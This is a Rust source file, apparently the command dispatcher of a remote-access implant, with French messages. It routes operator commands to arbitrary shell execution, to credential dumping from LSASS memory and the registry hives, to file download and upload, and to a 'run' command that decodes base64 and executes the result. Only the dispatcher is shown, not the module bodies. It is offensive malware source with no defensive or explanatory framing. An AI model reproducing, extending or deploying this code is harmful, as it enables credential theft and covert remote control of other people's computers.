pub mod creds;
pub mod shell;
pub mod shell_builtin;
pub mod transfer;

pub fn dispatch(command: &str, args: &str) -> String {
    let result = std::panic::catch_unwind(|| run_module(command, args));
    match result {
        Ok(s) => s,
        Err(_) => format!("[{}] panique dans le module", command),
    }
}

fn run_module(command: &str, args: &str) -> String {
    match command {
        "shell"                => shell::run(args),
        "bshell"               => shell_builtin::run(args),
        "creds" | "creduser"   => creds::dump_lsass(),
        "credsmachine"         => creds::dump_hive(),
        "download"             => transfer::download(args),
        "upload"               => transfer::upload(args),
        "run"                  => run_script(args),
        other                  => format!("commande inconnue : {}", other),
    }
}

fn run_script(args: &str) -> String {
    use base64::Engine;
    let decoded = base64::engine::general_purpose::STANDARD
        .decode(args.trim())
        .map(|b| String::from_utf8_lossy(&b).to_string())
        .unwrap_or_else(|_| args.to_string());
    shell::run(&decoded)
}
